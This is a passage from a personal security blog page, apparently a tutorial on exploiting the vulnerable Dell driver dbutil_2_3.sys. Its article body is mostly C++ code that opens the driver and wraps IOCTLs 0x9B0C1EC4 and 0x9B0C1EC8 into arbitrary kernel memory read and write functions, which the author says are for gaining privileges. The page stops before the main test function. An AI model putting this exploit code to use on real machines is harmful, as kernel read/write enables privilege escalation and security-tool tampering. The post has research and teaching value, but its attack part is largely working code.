<!DOCTYPE html>

<html lang="en-us">
    <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />

    <meta name="generator" content="Hugo 0.125.3">

    

    

    
        
            <meta
                name="description"
                content="This is my new hugo site" />
        

        
            <meta
                name="keywords"
                content="security,cryptohack,writeups,cyber" />
        

        
            <meta
                name="author"
                content="yoavshah" />
        

    


    <title>
        
            Read/Write using dbutil_2_3 |
            SecurityBlog
        
    </title>

    


    
    

    
    


    
    


    
    


    
    

    


    
    

    

    

        
        


        
        


        <link
            rel="stylesheet"
            href="/css/index_d751713.min.912d03bce61461ecbc3ca083479e1ed814bba94df76d0bdc6aa88fdca33621b9bb410dc2c81af31e8101fec62decfa5f6e48901ad673bc5056d2f1d1f2368a34.css"
            integrity="sha512-kS0DvOYUYey8PKCDR54e2BS7qU33bQvcaqiP3KM2Ibm7QQ3CyBrzHoEB/sYt7PpfbkiQGtZzvFBW0vHR8jaKNA==" />
    


    
    

    

    

    


    
		
        

            




    
        
    




<link
    rel="stylesheet"
    href="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.css"
    integrity="sha384-n8MVd4RsNIU0tAv4ct0nTaAbDJwPJzDEaqSD1odI+WdtXRGWt2kTvGFasHpSy3SV"
    crossorigin="anonymous" />


<script
    defer
    src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.js"
    integrity="sha384-XjKyOOlGwcjNTAIQHIpgOno0Hl1YQqzUOEleOLALmuqehneUG+vnGctmUb0ZY0l8"
    crossorigin="anonymous"></script>


<script
    defer
    src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/contrib/auto-render.min.js"
    integrity="sha384-+VBxd3r6XgURycqtZ117nYw44OOcIax56Z4dCRWbxyPt0Koah1uHoK0o4+/RRE05"
    crossorigin="anonymous"
    
        onload="renderMathInElement(document.body , { trust: true });"
    ></script>

<script>
    document.addEventListener("DOMContentLoaded", function () {
        renderMathInElement(document.body, {
            
            
            delimiters: [
                { left: "$$", right: "$$", display: true },
                { left: "$", right: "$", display: false },
                { left: "\\(", right: "\\)", display: false },
                { left: "\\[", right: "\\]", display: true },
            ],
            
            throwOnError: false,

            
                trust: true
            
        });
    });
</script>

        

    
</head>



    <body>
        <header class="header">
    <div class="header_left">
        
    </div>

    <div class="header_middle">
        
            Read/Write using dbutil_2_3 -
            SecurityBlog
        
    </div>
</header>



        <main>
            <aside class="sidebar" style="overflow-y: auto;">
    



    
    

    
    

    

    <ul class="section-tree">
        
            
                <li
                    
                        class="dir closed-dir"
                    >
                    <span class="dir-text"> Cryptohack </span>

                    



    
    

    
    

    

    <ul class="section-tree">
        
            
                <li
                    
                        class="dir closed-dir"
                    >
                    <span class="dir-text"> diffie-helman </span>

                    



    
    

    
    

    

    <ul class="section-tree">
        
            
                <li class="file">
                    <a href="https://yoavshah.github.io/cryptohack/diffie-hellman/0-diffie_hellman_explained/" title="./cryptohack/diffie-hellman/0-diffie_hellman_explained/">
                        
                            0-diffie_hellman_explained
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="https://yoavshah.github.io/cryptohack/diffie-hellman/1-parameter_injection/" title="./cryptohack/diffie-hellman/1-parameter_injection/">
                        
                            1-parameter_injection
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="https://yoavshah.github.io/cryptohack/diffie-hellman/2-export_grade/" title="./cryptohack/diffie-hellman/2-export_grade/">
                        
                            2-export_grade
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="https://yoavshah.github.io/cryptohack/diffie-hellman/3-static_client/" title="./cryptohack/diffie-hellman/3-static_client/">
                        
                            3-static_client
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="https://yoavshah.github.io/cryptohack/diffie-hellman/4-additive/" title="./cryptohack/diffie-hellman/4-additive/">
                        
                            4-additive
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="https://yoavshah.github.io/cryptohack/diffie-hellman/5-static_client_2/" title="./cryptohack/diffie-hellman/5-static_client_2/">
                        
                            5-static_client_2
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="https://yoavshah.github.io/cryptohack/diffie-hellman/6-script_kiddie/" title="./cryptohack/diffie-hellman/6-script_kiddie/">
                        
                            6-script_kiddie
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="https://yoavshah.github.io/cryptohack/diffie-hellman/7-the_matrix/" title="./cryptohack/diffie-hellman/7-the_matrix/">
                        
                            7-the_matrix
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="https://yoavshah.github.io/cryptohack/diffie-hellman/8-the_matrix_reloaded/" title="./cryptohack/diffie-hellman/8-the_matrix_reloaded/">
                        
                            8-the_matrix_reloaded
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="https://yoavshah.github.io/cryptohack/diffie-hellman/9-the_matrix_revolutions/" title="./cryptohack/diffie-hellman/9-the_matrix_revolutions/">
                        
                            9-the_matrix_revolutions
                        
                    </a>
                </li>
            
        
    </ul>


                </li>
            
        
            
                <li
                    
                        class="dir closed-dir"
                    >
                    <span class="dir-text"> hashes </span>

                    



    
    

    
    

    

    <ul class="section-tree">
        
            
                <li class="file">
                    <a href="https://yoavshah.github.io/cryptohack/hashes/1-collider/" title="./cryptohack/hashes/1-collider/">
                        
                            1-collider
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="https://yoavshah.github.io/cryptohack/hashes/2-hash_stuffing/" title="./cryptohack/hashes/2-hash_stuffing/">
                        
                            2-hash_stuffing
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="https://yoavshah.github.io/cryptohack/hashes/3-primed5/" title="./cryptohack/hashes/3-primed5/">
                        
                            3-PriMeD5
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="https://yoavshah.github.io/cryptohack/hashes/4-twin_keys/" title="./cryptohack/hashes/4-twin_keys/">
                        
                            4-twin_keys
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="https://yoavshah.github.io/cryptohack/hashes/5-no_difference/" title="./cryptohack/hashes/5-no_difference/">
                        
                            5-no_difference
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="https://yoavshah.github.io/cryptohack/hashes/6-md0/" title="./cryptohack/hashes/6-md0/">
                        
                            6-md0
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="https://yoavshah.github.io/cryptohack/hashes/7-mdflag/" title="./cryptohack/hashes/7-mdflag/">
                        
                            7-mdflag
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="https://yoavshah.github.io/cryptohack/hashes/8-mixed_up/" title="./cryptohack/hashes/8-mixed_up/">
                        
                            8-mixed_up
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="https://yoavshah.github.io/cryptohack/hashes/9-invariant/" title="./cryptohack/hashes/9-invariant/">
                        
                            9-invariant
                        
                    </a>
                </li>
            
        
    </ul>


                </li>
            
        
            
                <li
                    
                        class="dir closed-dir"
                    >
                    <span class="dir-text"> rsa </span>

                    



    
    

    
    

    

    <ul class="section-tree">
        
            
                <li class="file">
                    <a href="https://yoavshah.github.io/cryptohack/rsa/0-rsa_explained/" title="./cryptohack/rsa/0-rsa_explained/">
                        
                            0-rsa_explained
                        
                    </a>
                </li>
            
        
    </ul>


                </li>
            
        
            
                <li
                    
                        class="dir closed-dir"
                    >
                    <span class="dir-text"> symmetric </span>

                    



    
    

    
    

    

    <ul class="section-tree">
        
            
                <li class="file">
                    <a href="https://yoavshah.github.io/cryptohack/symmetric/01-passwords_as_keys/" title="./cryptohack/symmetric/01-passwords_as_keys/">
                        
                            01-passwords_as_keys
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="https://yoavshah.github.io/cryptohack/symmetric/02-ecbcbcwtf/" title="./cryptohack/symmetric/02-ecbcbcwtf/">
                        
                            02-ecbcbcwtf
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="https://yoavshah.github.io/cryptohack/symmetric/03-ecb_oracle/" title="./cryptohack/symmetric/03-ecb_oracle/">
                        
                            03-ecb_oracle
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="https://yoavshah.github.io/cryptohack/symmetric/04-flipping_cookie/" title="./cryptohack/symmetric/04-flipping_cookie/">
                        
                            04-flipping_cookie
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="https://yoavshah.github.io/cryptohack/symmetric/05-lazy_cbc/" title="./cryptohack/symmetric/05-lazy_cbc/">
                        
                            05-lazy_cbc
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="https://yoavshah.github.io/cryptohack/symmetric/06-triple_des/" title="./cryptohack/symmetric/06-triple_des/">
                        
                            06-triple_des
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="https://yoavshah.github.io/cryptohack/symmetric/07-symmetry/" title="./cryptohack/symmetric/07-symmetry/">
                        
                            07-symmetry
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="https://yoavshah.github.io/cryptohack/symmetric/08-bean_counter/" title="./cryptohack/symmetric/08-bean_counter/">
                        
                            08-bean_counter
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="https://yoavshah.github.io/cryptohack/symmetric/09-ctrime/" title="./cryptohack/symmetric/09-ctrime/">
                        
                            09-ctrime
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="https://yoavshah.github.io/cryptohack/symmetric/10-logon_zero/" title="./cryptohack/symmetric/10-logon_zero/">
                        
                            10-logon_zero
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="https://yoavshah.github.io/cryptohack/symmetric/11-stream_consciousness/" title="./cryptohack/symmetric/11-stream_consciousness/">
                        
                            11-stream_consciousness
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="https://yoavshah.github.io/cryptohack/symmetric/12-dancing_queen/" title="./cryptohack/symmetric/12-dancing_queen/">
                        
                            12-dancing_queen
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="https://yoavshah.github.io/cryptohack/symmetric/13-oh-snap/" title="./cryptohack/symmetric/13-oh-snap/">
                        
                            13-oh-snap
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="https://yoavshah.github.io/cryptohack/symmetric/14-paper_plane/" title="./cryptohack/symmetric/14-paper_plane/">
                        
                            14-paper_plane
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="https://yoavshah.github.io/cryptohack/symmetric/15-forbidden_fruit/" title="./cryptohack/symmetric/15-forbidden_fruit/">
                        
                            15-forbidden_fruit
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="https://yoavshah.github.io/cryptohack/symmetric/16-beatboxer/" title="./cryptohack/symmetric/16-beatboxer/">
                        
                            16-beatboxer
                        
                    </a>
                </li>
            
        
    </ul>


                </li>
            
        
    </ul>


                </li>
            
        
            
                <li
                    
                        class="dir opened-dir"
                    >
                    <span class="dir-text"> Windows </span>

                    



    
    

    
    

    

    <ul class="section-tree">
        
            
                <li
                    
                        class="dir opened-dir"
                    >
                    <span class="dir-text"> Kernel </span>

                    



    
    

    
    

    

    <ul class="section-tree">
        
            
                <li class="file">
                    <a href="https://yoavshah.github.io/windows/kernel/readwrite_using_dbutil_2_3/" title="./windows/kernel/readwrite_using_dbutil_2_3/">
                        
                            Read/Write using dbutil_2_3
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="https://yoavshah.github.io/windows/kernel/reverse_dbutil_2_3/" title="./windows/kernel/reverse_dbutil_2_3/">
                        
                            Reverse dbutil_2_3
                        
                    </a>
                </li>
            
        
    </ul>


                </li>
            
        
            
                <li
                    
                        class="dir closed-dir"
                    >
                    <span class="dir-text"> Portable-Executable </span>

                    



    
    

    
    

    

    <ul class="section-tree">
        
            
                <li class="file">
                    <a href="https://yoavshah.github.io/windows/portable-executable/fileinfector/" title="./windows/portable-executable/fileinfector/">
                        
                            FileInfector
                        
                    </a>
                </li>
            
        
    </ul>


                </li>
            
        
    </ul>


                </li>
            
        
    </ul>


</aside>
<aside class="exapandable"></aside>


            
    <article class="main">
        <button
    class="sidebar-toggle-btn"
    type="menu"
    aria-expanded="false"
    aria-haspopup="true">
    <i class="bi bi-list"></i>
</button>



        <div class="title">
            <h1 class="title-header">
                Read/Write using dbutil_2_3
            </h1>

            <div class="author-date-readtime">
                

                    
                        <div class="author" title="Author">
                            <i class="bi bi-person"></i>
                            <a
                                href="/author/yoavshah/"
                                class="cat-btn">
                                yoavshah
                            </a>
                        </div>
                    

                

                
                    <div class="date" title="Date">
                        <i class="bi bi-calendar3"></i>
                        <time
                            datetime="2024.08.07"
                            >2024.08.07
                        </time>
                    </div>
                

                
                    <div
                        class="readtime"
                        title="Time to Read">
                        <i class="bi bi-clock"></i>
                        3 mins to read
                    </div>
                
            </div>
        </div>

        <div class="article-meta">
            

            

            
                <div class="breadcumb">
                    <i class="bi bi-folder"></i>
                    
    
    
    




<a href="https://yoavshah.github.io/" class="bread-btn">
    
        <i class="bi bi-house-fill"></i>
    

    
        Home
    
</a>




    /



<a href="https://yoavshah.github.io/windows/" class="bread-btn">
    

    
        Windows
    
</a>




    /



<a href="https://yoavshah.github.io/windows/kernel/" class="bread-btn">
    

    
        Kernel
    
</a>




    /



<a href="https://yoavshah.github.io/windows/kernel/readwrite_using_dbutil_2_3/" class="bread-btn">
    

    
        
            Read/Write using dbutil_2_3
        

    
</a>

                </div>
            

            
        </div>

        
            <nav id="TableOfContents">
  <ul>
    <li><a href="#architecture">Architecture</a></li>
    <li><a href="#constructor">Constructor</a></li>
    <li><a href="#read-ioctl">Read IOCTL</a></li>
  </ul>
</nav>
        


        <div class="content">
            
                <p>This article is the second article about dbutil_2_3.sys, in this one I will exploit the vulnerabilities in this driver to gain priviledges in the computer
We will use the following IOCTLs which allow us to read and write memory to any location in the kernel.</p>
<h2 id="architecture">Architecture</h2>
<p>I will first create a class called <code>DBUtilInterface</code> which will have the functionality we need for the driver.</p>







<div class="codeblock">
    
        <div class="copy-button-box">
            <button class="copy-button" state="copy" data="#ZgotmplZ">
                <i class="bi bi-copy"></i>
            </button>
        </div>
    

    
        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">DBUtilInterface</span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">private</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>	HANDLE device_handle;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>	DBUtilInterface();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#f92672">~</span>DBUtilInterface();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">bool</span> <span style="color:#a6e22e">read_kernel_memory</span>(<span style="color:#66d9ef">void</span><span style="color:#f92672">*</span> dst, <span style="color:#66d9ef">void</span><span style="color:#f92672">*</span> src, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> size);
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">bool</span> <span style="color:#a6e22e">write_kernel_memory</span>(<span style="color:#66d9ef">void</span><span style="color:#f92672">*</span> dst, <span style="color:#66d9ef">void</span><span style="color:#f92672">*</span> src, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> size);
</span></span><span style="display:flex;"><span>};</span></span></code></pre></div>
    
</div>
<h2 id="constructor">Constructor</h2>
<p>We want that in the constructor of the class a new handle to the device driver will be open</p>







<div class="codeblock">
    
        <div class="copy-button-box">
            <button class="copy-button" state="copy" data="#define%20DBUTIL_DEVICE_NAME%20L%22%5c%5c%5c%5c.%5c%5cDBUtil_2_3%22%20">
                <i class="bi bi-copy"></i>
            </button>
        </div>
    

    
        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#75715e">#define DBUTIL_DEVICE_NAME L&#34;\\\\.\\DBUtil_2_3&#34; </span></span></span></code></pre></div>
    
</div>







<div class="codeblock">
    
        <div class="copy-button-box">
            <button class="copy-button" state="copy" data="#ZgotmplZ">
                <i class="bi bi-copy"></i>
            </button>
        </div>
    

    
        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>DBUtilInterface<span style="color:#f92672">::</span>DBUtilInterface()
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">this</span><span style="color:#f92672">-&gt;</span>device_handle <span style="color:#f92672">=</span> CreateFileW(DBUTIL_DEVICE_NAME,
</span></span><span style="display:flex;"><span>		GENERIC_WRITE <span style="color:#f92672">|</span> GENERIC_READ,
</span></span><span style="display:flex;"><span>		FILE_SHARE_WRITE,
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">nullptr</span>,
</span></span><span style="display:flex;"><span>		OPEN_EXISTING,
</span></span><span style="display:flex;"><span>		<span style="color:#ae81ff">0</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">nullptr</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>}</span></span></code></pre></div>
    
</div>
<p>And that in the destructor of the class the handle will close</p>







<div class="codeblock">
    
        <div class="copy-button-box">
            <button class="copy-button" state="copy" data="#ZgotmplZ">
                <i class="bi bi-copy"></i>
            </button>
        </div>
    

    
        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>DBUtilInterface<span style="color:#f92672">::~</span>DBUtilInterface()
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">this</span><span style="color:#f92672">-&gt;</span>device_handle <span style="color:#f92672">!=</span> INVALID_HANDLE_VALUE)
</span></span><span style="display:flex;"><span>		CloseHandle(<span style="color:#66d9ef">this</span><span style="color:#f92672">-&gt;</span>device_handle);
</span></span><span style="display:flex;"><span>}</span></span></code></pre></div>
    
</div>
<h2 id="read-ioctl">Read IOCTL</h2>
<p>Now we will create the function that will interact with IOCTL 0x9B0C1EC4 which allows us to read any address in the kernel.</p>
<p>As shown in the other article the struct the driver the IOCTL expects a struct containing 3 void* and after that an empty buffer of any size that will get the output data.</p>
<p>The pack attributes telling the compiler to not add padding between variables</p>







<div class="codeblock">
    
        <div class="copy-button-box">
            <button class="copy-button" state="copy" data="#pragma%20pack%28push,%201%29%0d%0atypedef%20struct%20%7b%0d%0a%09void*%20unknown_address;%0d%0a%09void*%20src_address1;%0d%0a%09void*%20src_address2;%0d%0a%09char%20data[];%0d%0a%7d%20ioctl_9B0C1EC4_struct;%0d%0a#pragma%20pack%28pop%29">
                <i class="bi bi-copy"></i>
            </button>
        </div>
    

    
        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#75715e">#pragma pack(push, 1)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> {
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">void</span><span style="color:#f92672">*</span> unknown_address;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">void</span><span style="color:#f92672">*</span> src_address1;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">void</span><span style="color:#f92672">*</span> src_address2;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">char</span> data[];
</span></span><span style="display:flex;"><span>} ioctl_9B0C1EC4_struct;
</span></span><span style="display:flex;"><span><span style="color:#75715e">#pragma pack(pop)</span></span></span></code></pre></div>
    
</div>
<p>Now we can write the function that creates this struct, fill it up with the addresses, sends it to the device driver and read from it.</p>







<div class="codeblock">
    
        <div class="copy-button-box">
            <button class="copy-button" state="copy" data="#ZgotmplZ">
                <i class="bi bi-copy"></i>
            </button>
        </div>
    

    
        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#66d9ef">bool</span> DBUtilInterface<span style="color:#f92672">::</span>read_kernel_memory(<span style="color:#66d9ef">void</span><span style="color:#f92672">*</span> dst, <span style="color:#66d9ef">void</span><span style="color:#f92672">*</span> src, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> size)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	DWORD _;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> total_struct_size <span style="color:#f92672">=</span> <span style="color:#66d9ef">sizeof</span>(dbutil_ioctl_read_write_struct) <span style="color:#f92672">+</span> size;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	dbutil_ioctl_read_write_struct<span style="color:#f92672">*</span> ioctl_struct <span style="color:#f92672">=</span> <span style="color:#66d9ef">reinterpret_cast</span><span style="color:#f92672">&lt;</span>dbutil_ioctl_read_write_struct<span style="color:#f92672">*&gt;</span>(HeapAlloc(GetProcessHeap(),
</span></span><span style="display:flex;"><span>		HEAP_ZERO_MEMORY,
</span></span><span style="display:flex;"><span>		total_struct_size));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>ioctl_struct)
</span></span><span style="display:flex;"><span>	{
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> false;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	ioctl_struct<span style="color:#f92672">-&gt;</span>unknown_address <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>	ioctl_struct<span style="color:#f92672">-&gt;</span>src_address1 <span style="color:#f92672">=</span> src;
</span></span><span style="display:flex;"><span>	ioctl_struct<span style="color:#f92672">-&gt;</span>src_address2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">bool</span> succeed <span style="color:#f92672">=</span> DeviceIoControl(<span style="color:#66d9ef">this</span><span style="color:#f92672">-&gt;</span>device_handle,
</span></span><span style="display:flex;"><span>		<span style="color:#ae81ff">0x9B0C1EC4</span>,
</span></span><span style="display:flex;"><span>		ioctl_struct,
</span></span><span style="display:flex;"><span>		total_struct_size,
</span></span><span style="display:flex;"><span>		ioctl_struct,
</span></span><span style="display:flex;"><span>		total_struct_size,
</span></span><span style="display:flex;"><span>		<span style="color:#f92672">&amp;</span>_,
</span></span><span style="display:flex;"><span>		NULL);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (succeed)
</span></span><span style="display:flex;"><span>	{
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">for</span> (size_t i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> size; i<span style="color:#f92672">++</span>)
</span></span><span style="display:flex;"><span>		{
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">reinterpret_cast</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">char</span><span style="color:#f92672">*&gt;</span>(dst)[i] <span style="color:#f92672">=</span> ioctl_struct<span style="color:#f92672">-&gt;</span>data[i];
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	HeapFree(GetProcessHeap(), NULL, ioctl_struct);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> succeed;
</span></span><span style="display:flex;"><span>}</span></span></code></pre></div>
    
</div>
<p>We can write the other function the same way because it uses the same structs</p>







<div class="codeblock">
    
        <div class="copy-button-box">
            <button class="copy-button" state="copy" data="#ZgotmplZ">
                <i class="bi bi-copy"></i>
            </button>
        </div>
    

    
        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#66d9ef">bool</span> DBUtilInterface<span style="color:#f92672">::</span>write_kernel_memory(<span style="color:#66d9ef">void</span><span style="color:#f92672">*</span> dst, <span style="color:#66d9ef">void</span><span style="color:#f92672">*</span> src, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> size)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	DWORD _;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> total_struct_size <span style="color:#f92672">=</span> <span style="color:#66d9ef">sizeof</span>(dbutil_ioctl_read_write_struct) <span style="color:#f92672">+</span> size;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	dbutil_ioctl_read_write_struct<span style="color:#f92672">*</span> ioctl_struct <span style="color:#f92672">=</span> <span style="color:#66d9ef">reinterpret_cast</span><span style="color:#f92672">&lt;</span>dbutil_ioctl_read_write_struct<span style="color:#f92672">*&gt;</span>(HeapAlloc(GetProcessHeap(),
</span></span><span style="display:flex;"><span>		HEAP_ZERO_MEMORY,
</span></span><span style="display:flex;"><span>		total_struct_size));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>ioctl_struct)
</span></span><span style="display:flex;"><span>	{
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> false;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	ioctl_struct<span style="color:#f92672">-&gt;</span>unknown_address <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>	ioctl_struct<span style="color:#f92672">-&gt;</span>src_address1 <span style="color:#f92672">=</span> dst;
</span></span><span style="display:flex;"><span>	ioctl_struct<span style="color:#f92672">-&gt;</span>src_address2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> (size_t i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> size; i<span style="color:#f92672">++</span>)
</span></span><span style="display:flex;"><span>	{
</span></span><span style="display:flex;"><span>		ioctl_struct<span style="color:#f92672">-&gt;</span>data[i] <span style="color:#f92672">=</span> <span style="color:#66d9ef">reinterpret_cast</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">char</span><span style="color:#f92672">*&gt;</span>(src)[i];
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">bool</span> succeed <span style="color:#f92672">=</span> DeviceIoControl(<span style="color:#66d9ef">this</span><span style="color:#f92672">-&gt;</span>device_handle,
</span></span><span style="display:flex;"><span>		<span style="color:#ae81ff">0x9B0C1EC8</span>,
</span></span><span style="display:flex;"><span>		ioctl_struct,
</span></span><span style="display:flex;"><span>		total_struct_size,
</span></span><span style="display:flex;"><span>		ioctl_struct,
</span></span><span style="display:flex;"><span>		total_struct_size,
</span></span><span style="display:flex;"><span>		<span style="color:#f92672">&amp;</span>_,
</span></span><span style="display:flex;"><span>		NULL);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	HeapFree(GetProcessHeap(), NULL, ioctl_struct);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> succeed;
</span></span><span style="display:flex;"><span>}</span></span></code></pre></div>
    
</div>
<p>Now let&rsquo;s check those function that everything is running correctly using the main function</p>







<div class="codeblock">
    
        <div class="copy-button-box">
